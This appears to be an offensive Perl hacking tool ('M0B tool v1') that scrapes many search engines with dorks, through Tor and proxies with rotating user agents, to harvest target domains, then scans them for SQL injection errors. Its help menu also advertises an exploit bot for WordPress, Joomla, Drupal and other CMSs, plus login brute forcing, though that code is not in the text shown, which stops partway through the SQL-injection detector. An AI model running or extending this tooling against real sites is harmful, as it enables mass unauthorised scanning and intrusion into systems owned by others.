#############################
#   Tool for educational    #
#       purpose only        #
#        created by         #        
#    M0B - Mobrine hayde    #
#############################

#!usr/bin/perl

######################
#                    #
#    M0B             #
#      Scan tool     #
#                    #
######################
###############################################
use if $^O eq "MSWin32", Win32::Console::ANSI;#
use LWP::UserAgent;  		                  #
use HTTP::Request;   		                  #
use Term::ANSIColor; 		                  #
use IO::Socket;                               #
use IO::Socket::INET;                         #
use Term::ANSIColor;                          #
use URI::URL;                                 #
use HTTP::Cookies;                            #
use POSIX qw(uname);		                  # 
use HTTP::Request::Common qw(POST);           #
use HTTP::Request::Common qw(GET);            #
use JSON qw( decode_json encode_json );       #
###############################################
#################################### DONT TOUCH THIS / TOUCH THIS IF YOU WANT
######################################################################################################
##################################### for search engines #############################################
############################## User agent with tor proxy
$ag = LWP::UserAgent->new();
$ag->agent("$us1");
$ag->proxy([qw/ http https /] => 'socks://localhost:9050'); # Tor proxy
$ag->cookie_jar({});
############################## Normal User agent
$ag1 = LWP::UserAgent->new();
$ag1->agent("$us1");
############################## User agent with japanese proxy ( for livedoor & rakuten )
$jpr = "put japanese proxy here";
$aj = LWP::UserAgent->new();
$aj->agent("$us1");
$aj->proxy([qw/ http https /] => "http://$jpr"); # japanese proxy
$aj->cookie_jar({});
##################################### for exploit ####################################################
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
##################################### auto add folders
$BruteForce="BruteForce";
    if (-e $BruteForce) 
    {
    }
    else
    {
        mkdir $BruteForce or die "Error creating directory: $BruteForce";
    }

	$hidden="hidden";
    if (-e $hidden) 
    {
    }
    else
    {
        mkdir $hidden or die "Error creating directory: $hidden";
    }
	
	$result="result";
    if (-e $result) 
    {
    }
    else
    {
        mkdir $result or die "Error creating directory: $result";
    }
	
	$rez="rez";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }
	
$cms="cms";
    if (-e $cms) 
    {
    }
    else
    {
        mkdir $cms or die "Error creating directory: $cms";
    }
	
$sql="sql";
    if (-e $sql) 
    {
    }
    else
    {
        mkdir $sql or die "Error creating directory: $sql";
    }
######################################################################################################
$oni=("
	##     ##   #####   ########  
	###   ###  ##   ##  ##     ## 
	#### #### ##     ## ##     ## 
	## ### ## ##     ## ########  
	##     ## ##     ## ##     ## 
	##     ##  ##   ##  ##     ## 
	##     ##   #####   ########  
");
variables();
main();
sub uname {
	 print("[+] UNAME: ");
my @uname = uname();
print $uname[0] . " " . $uname[2];
}
sub help {
     	system('cls');
if ( @uname =~ Linux ) {    #for linux os
	 system("clear");
     system('M0B tool v1');
	 }
     print colored("$oni\n",'blue');
     print " \n\n      M0B tool v1";
     print " \n            created by M0B \n\n";
	print "\n[!] Usage : perl $0 <argument>\n";
	print "\n"; 
	print " --other     |get second tools.\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --m         |select search engine you want.\n";
	print "             |ex : perl $0 --m baidu ...\n";
	print "             |or you can also use all engines\n";
	print "             |ex : perl $0 --m all ...\n";
	print "             |Valid search engines: baidu, bing, livedoor,\n";
	print "             |sogou, oscobo, mywebsearch, teoma, rakuten, ask \n";
	print "-------------+-------------------------------------------------------------\n";
	print " --d         |dork to scan.\n";
	print "             |ex : perl $0 --m baidu --d book.php?id=\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --o         |Output file to save dork scan results.\n";
	print "             |Remarque : all results gonna be saved automatically\n";
	print "             |in /result\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --sql       |scan a list of sites.\n";
	print "             |find sql injections \n";
	print "-------------+-------------------------------------------------------------\n";
	print " --scan      |scan a list of sites.\n";
	print "             |scan CMS \n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --portscan  |scan a ip ports.\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --ex        |exploit bot [DRUPAL - ZENCART - WORDPRESS - PRESTASHOP - JOOMLA - LOKOMEDIA ]\n";
	print "-------------+-------------------------------------------------------------\n";
	print "-------------+-------------------------------------------------------------\n";
	print " --br        |brute force [WORDPRESS - JOOMLA - DRUPAL - MAGENTO - OPENCART]\n";
	print " --lp        |password list for brute force [ if you don't have use passwords.txt ]\n";
	print "---------------------------------------------------------------------------\n";
	exit();
}
sub main{
     system('cls');
if ( @uname =~ Linux ) {    #for linux os
	 system("clear");
     system('M0B tool v1');
	 }
     print colored("$oni\n",'blue');
     print " \n\n      M0B tool v1";
     print " \n            created by M0B \n\n";
     if (@ARGV<1){print "\n[!] For Help : perl $0 --help\n\n\n" ;
	 }
	}

sub variables
{
     my $i=0;
     foreach (@ARGV)
     {
#
sub item
{
    my $n = shift // '+';
    return color('bold red')," ["
    , color('bold green'),"$n"
    , color('bold red'),"] "
    , color("bold white")
    ;
}
######################## user agent
@auser = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 AskTbMPC2/3.12.5.17640 Firefox/3.6.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; es-US; rv:1.9.2.27) Gecko/20120216 Firefox/3.6.27",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.24) Gecko/20111109 CentOS/3.6-3.el5.centos Firefox/3.6.24",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 GTB7.1 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20120306 Firefox/3.6.28",
"Mozilla/5.0 ((Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100115 Ubuntu/10.04 (lucid) Firefox/3.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 AskTbORJ/3.15.25.36191 Firefox/3.6.28",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.11) Gecko/20101016 Firefox/3.6.66 GTB7",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20101005 Fedora/3.6.10-1.fc14 Firefox/3.6.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/20100628 Firefox/3.6.6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTB6",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.26) Gecko/20120128 BTRS25104 Firefox/3.6.26 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; it; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-PT; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.10) Gecko/20100914 AskTbORJ/3.15.25.36191 Firefox/3.6.10",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.20) Gecko/20110818 SUSE/3.6.20-0.2.1 Firefox/3.6.20",
"Mozilla/5.0 (X11; U; SunOS sun4u; pl-PL; rv:1.9.1b5pre) Gecko/20100403 Firefox/3.6.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Gecko/20100527 Firefox/3.6.4 EvoHtmlToPdf/2.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB7.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 AlexaToolbar/amznf-3.0.20120501",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.12) Gecko/20101026 SUSE/3.6.12-0.6.1 Firefox/3.6.12",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.6) Gecko/20100625 LBEXG/1.0.9 AskTbORJ/3.15.25.36191 BRI/1 Firefox/3.6.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.39) Gecko/20101203 Firefox/3.6.12 (.NET CLR 3.5.30733)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; fa; rv:1.9.1.4) Gecko/20100513 Firefox/3.6.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 GTB7.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; uk; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 WebMoney Advisor",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729; .NET4.0C)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17) Gecko/20110421 Red Hat/3.6.17-1.el6_0 Firefox/3.6.17",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17",
"Mozilla/5.0 (X11; U; Linux x86_64; en-NZ; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16",
"Mozilla/5.0 (X11; U; Linux i686; es-MX; rv:1.9.2.17) Gecko/20110422 Ubuntu/10.04 (lucid) Firefox/3.6.17",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; es-AR; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.12 XF_mmhpset");
$us1 = $auser[rand @auser];
################### my baby my wife
@country =('com',
	   'ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
           'net', 'org','biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
           'name', 'aero', 'xxx','asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
           'pro', 'travel','fr','net','edu','gov','info','Balcan','xxx','edu', 'gov', 'mil',
           'biz', 'cat', 'com', 'int','net', 'org', 'pro', 'tel', 'aero', 'asia',
           'coop', 'info', 'jobs', 'mobi', 'name', 'museum', 'travel');
######################## !~
$att="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|barra.uol.|whowhere.|hotbot.|amesville.|lycos|lygo.|orkut.|schema.|blogger.|bing.|w3.|yahoo.|yimg.|
                creativecommons.org|ndj6p3asftxboa7j.|.torproject.org|.lygo.com|.apache.org|live.|microsoft.|ask.|shifen.com|answers.|analytics.|googleadservices.|sapo.pt|favicon.|
                blogspot.|wordpress.|.css|scripts.js|jquery-1.|dmoz.|gigablast.|aol.|.macromedia.com|.sitepoint.|yandex.|www.tor2web.org|.securityfocus.com|.Bootstrap.|.metasploit.com|
                aolcdn.|altavista.|clusty.|teoma.|baiducontent.com|wisenut.|a9.|uolhost.|w3schools.|msn.|baidu.|hao123.|shifen.|procog.|facebook.|twitter.|flickr.|.adobe.com|oficinadanet.|
                elephantjmjqepsw.|.duckduckgo.io|kbhpodhnfxl3clb4|.scanalert.com|.prototype.|feedback.core|4shared.|.KeyCodeTab|.style.|www\/cache\/i1|.className.|=n.|a.Ke=|Y.config|
                .goodsearch.com|127.0.0.1|style.top|n.Img|n.canvas.|t.search|Y.Search.|a.href|a.currentStyle|a.style|yastatic.|.oth.net|.hotbot.com|.zhongsou.com|ezilon.com|.example.com|location.href|
                .navigation.|.hostname.|.bingj.com|Y.Mobile.|srpcache?p|stackoverflow.|shifen.|baidu.|baiducontent.|gstatic.|php.net|wikipedia.|webcache.|inurl.|naver.|navercorp.|windows.|
                window.|.devmedia|imasters.|.inspcloud.com|.lycos.com|.scorecardresearch.com|.target.|JQuery.min|Element.location.|document.|exploit-db|packetstormsecurity.|1337day|owasp|
                .sun.com|mobile10.dtd|onabort=function|inurl.com.br|purl.org|.dartsearch.net|r.cb|.classList.|.pt_BR.|github|microsofttranslator.com|.compete.com|.sogou.com|gmail.|blackle.com|
                boorow.com|gravatar.com|cookieSet|security|facebook|WindowsLiveTranslator|cache|74.125.153.132|inurl:|Network|adw.sapo|tripadvisor|yandex|Failed|tumblr.|wiki|inciclopedia.|
                sogoucdn.com|weixin.|snapshot.";
				
################ arguments
     if ($ARGV[$i] eq "--m"){$search_motor = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--d"){$search_dork = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--o"){$search_output = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--scan"){$search_scan = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--sql"){$search_sql = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--portscan"){$ip_scan = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--ex"){$ex_list = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--br"){$br_list = $ARGV[$i+1]}
     if ($ARGV[$i] eq "--lp"){$pass = $ARGV[$i+1]}
	 if ($ARGV[$i] eq "--help"){$help = &help}
	 if ($ARGV[$i] eq "--other"){$other = &other}
     $i++;
	 }
	 }
########################### redirect
	 if (defined($search_motor))
{
     print "[+] STARTING DORK SCAN\n" ;
     print "[+] DORK TO SCAN : $search_dork\n\n\n" ;
redork();
}

sub redork {
if (not defined($search_dork)) {
print colored ("[+]You haven't writed dork yet!\n\n","white on_red");
exit;
}

if ($search_motor !~ /teoma|oscobo|mywebsearch|sogou|baidu|rakuten|livedoor|bing|all|ask/) {
print colored ("[+]Your search engine isn't good / doesn't exist in our list\n\n","white on_red");
exit;
}


print "[+] How want you scan your dork?\n\n";
print "[1] Scan my dork normally\n";
print "[2] Scan my dork with domains\n\n";

$number=<STDIN>;
chomp $number;
print "\n\n";
if($number eq '1'){
hitoridork();
}
if($number eq '2'){
domaindork();
}
if($number !~ /1|2/){
print "AHO DESU KA?\n\n";
redork();
}
}

sub domaindork {
OUTER: foreach $country(@country){
chomp $country;
if($number eq '2'){ # with domains
$dork="$search_dork+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
motors();
}
}
presento();
}

sub hitoridork {
$dork="$search_dork";
motors();
presento();
}


sub motors {
if ($search_motor =~ all) {
bing(),livedoor(),rakuten(),baidu(),sogou(),mywebsearch(),oscobo(),teoma(),ask(),
}
elsif ($search_motor =~ bing) {
bing();
}
elsif ($search_motor =~ livedoor) {
livedoor();
}
elsif ($search_motor =~ rakuten) {
rakuten();
}
elsif ($search_motor =~ baidu) {
baidu();
}
elsif ($search_motor =~ sogou) {
sogou();
}
elsif ($search_motor =~ mywebsearch) {
mywebsearch();
}
elsif ($search_motor =~ oscobo) {
oscobo();
}
elsif ($search_motor =~ teoma) {
teoma();
}
elsif ($search_motor =~ ask) {
ask();
}

}
sub presento {
############## special service if you have defined a output file wahahaha
if (defined($search_output)) {
sercl();
}
}
sub oscobo {
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "https://www.oscobo.com/search.php?is=$ii&q=$dork";


$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content !~ m/rel=\"nofollow\"/g) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http:///' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$link =~ s/\/\//\//g;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/oscobo.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub ask {
for ($ii = 1; $ii <= 2000; $ii+=1){

$url = "https://ask.com/web?q=$dork&page=$ii";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content !~ m/<p class="PartialSearchResults-item-url">/g) {$ii = 2000};

while($rrs =~ m/PartialSearchResults-item-url">(.*?)<\/p>/g){

$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:|^https:|^ftp:/)
       {
        $link = 'http://' . "$link" . '';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>result/ask.txt');
    print save "$link\n";
    close(save);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub mywebsearch {
for ($ii = 1; $ii <= 2000; $ii+=1){

$url = "https://int.search.mywebsearch.com/mywebsearch/GGweb.jhtml?searchfor=$dork&pn=$ii";


$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/did not match with any results./i) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){


$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/mywebsearch.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}
sub teoma {
for ($ii = 1; $ii <= 2000; $ii+=1){

$url = "http://www.teoma.com/web?q=$dork&tpr=10&page=$ii";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/did not match with any results./i) {$ii = 2000};

while($rrs =~ m/href=\"http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att|teoma/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|>|<|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/teoma.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub bing(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(save, '>>result/bing.txt');
    print save "$link\n";
    close(save);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}
sub sogou {
for ($ii = 1; $ii <= 45; $ii+=1){

$url = "http://www.sogou.com/web?query=$dork&page=$ii&ie=utf8";


$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/相关的网页。/i) {$ii = 45};

while($rrs =~ m/href=\"http:\/\/(.*?)\" id=/g){


$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /\"|\?|\=|index\.php/){
$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/sogou.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub rakuten {
for ($ii = 0; $ii <= 200000; $ii+=10){
$aj = LWP::UserAgent->new();
$aj->agent("$us1");
$aj->proxy([qw/ http https /] => "http://$jpr"); # japanese proxy
$aj->cookie_jar({});

$url = "https://websearch.rakuten.co.jp/Web?qt=$dork&st=$ii";
$resp = $aj->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/検索キーワードに該当するページがありません。/i) {$ii = 200000};

while($rrs =~ m/http:\/\/([^>]*)\//g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite| |yourdomain/){
	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
          if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/rakuten.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
}   

            push(@result,$link);
}
}
}
}
}
}

sub baidu{
for ($ii = 0; $ii <= 500; $ii+=10){

$url = "http://www.baidu.com/s?wd=$dork&pn=$ii";
$resp = $ag1->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;


while($rrs =~ m/style=\"text-decoration:none;\">(.*?)<\/a>/g){

$link = $1;


  if ( $link !~ /$att/)
  {
        if ($link !~ /^https:/)
       {
        $link = 'http://' . "$link" . '/';
       }



if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite|http:\/\/\/|yourdomain/){
	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
if($link !~ /...&nbsp;/){
	if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/baidu.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
} 

            push(@result,$link);
}
}
}
}
}
}
}

sub livedoor{
for ($ii = 1; $ii <= 200000; $ii+=1){


$url = "http://search.livedoor.com/search?q=$dork&search_btn=results&p=$ii";
$resp = $aj->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

if ( $resp->content =~ m/検索結果がありません。/i) {$ii = 200000};

while($rrs =~ m/http:\/\/(.*?)\"/g){



$link = $1;
  if ( $link !~ /$att/)
  {
        if ($link !~ /^http:/)
       {
        $link = 'http://' . "$link" . '/';
       }

if($link !~ /<|>|\"|\?|\=|index\.php|example|localhost|yoursite|http:\/\/\/|yourdomain/){

	$link =~ s/href=\"?http:\/\///;
	$link =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

	if  (!  grep (/$link/,@result))
          {
print "$link\n";
open(savea, '>>result/livedoor.txt');
    print savea "$link\n";
    close(savea);
if (defined($search_output)) {
open(savea, ">>$search_output");
    print savea "$link\n";
    close(savea);
} 
            push(@result,$link);
}
}
}
}
}
}

####################################
######## special service ;) ########
sub sercl {
print "\n\n[+] Your dork scan is finished , Can AUTO-M0B help you?\n\n";
print colored("[1] Do a cms scan for your list ?\n",'green');
print colored("[2] Find sql injection ?\n",'green');
print colored("[3] Leave me alone !!\n\n",'red');

$number=<STDIN>;
chomp $number;
if($number eq '1'){
$search_scan = "$search_output";
scan();
}
if($number eq '2'){
$search_sql = "$search_output";
sql();
}
if($number eq '3'){
exit;
}
if($number !~ /1|2|3/){
print "AHO DESU KA?\n\n";
sercl();
}
}
####################################
################ sql ###############
####################################
	 if (defined($search_sql))
{
     print "[+] SCANNING SITES\n" ;
     print "[+] LIST TO SCAN : $search_sql\n\n\n" ;
sql();
} 
sub sql {

open (search_sql, "<$search_sql") || die "\n YOUR LIST IS NOT FOUND\n\n";
my @search_sql = <search_sql>;
close search_sql;
 
foreach $site(@search_sql) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
sqldetect();
}
sub sqldetect($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent($auser[rand @auser]);
$ua->timeout (8);
 
#################### time work
my $check = $ua->get("$site")->content;
################### cms
print "SITE:";
print "$site\n";

if($check =~/You have an error in your SQL syntax|Query failed|SQL query failed|mysql_fetch_|mysql_fetch_array|mysql_num_rows|The used SELECT statements have a different number of columns/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-Vuln.txt');
    print save "$site";
    close(save);}
}
elsif($check =~/ODBC SQL Server Driver/) {
print "[!] MySQL Vulnerable\n";
if($number eq '1'){open(save, '>>sql/mySQL-Vuln.txt');
    print save "$site";
    close(save);}
}
